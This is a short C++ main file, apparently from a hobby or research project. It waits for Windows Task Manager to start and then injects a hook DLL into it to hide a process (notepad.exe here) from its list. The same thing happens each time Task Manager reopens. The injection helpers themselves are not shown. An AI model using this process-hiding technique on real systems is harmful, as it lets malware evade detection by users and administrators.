#include "pch.h"
#include "Process.hpp"
#include "WindowsException.hpp"
#include "Logger.hpp"
#include "SystemUtils.hpp"
#include <exception>
#include <iostream>
#include <chrono>
#include <thread>

constexpr wchar_t* NOTEPAD_EXE = L"notepad.exe";

int main()
{
	try 
	{
		while (true)
		{
			Logger::Instance().info(L"Checking for task manager");
			while (!SystemUtils::get_process_id(SystemUtils::TASK_MGR_EXE))
			{
				std::this_thread::sleep_for(std::chrono::seconds(1));
			}

			Logger::Instance().info(L"Found task manager process");
			SystemUtils::hide_process_from_tskmgr(NOTEPAD_EXE);
			Logger::Instance().info(L"Injected hook dll to task manager");

			while (SystemUtils::get_process_id(SystemUtils::TASK_MGR_EXE))
			{
				std::this_thread::sleep_for(std::chrono::seconds(1));
			}
			Logger::Instance().info(L"Task manager was closed");
		}
	}
	catch (WindowsException exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (std::exception exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (...)
	{
		OutputDebugString(L"Unexpected exception");
	}
}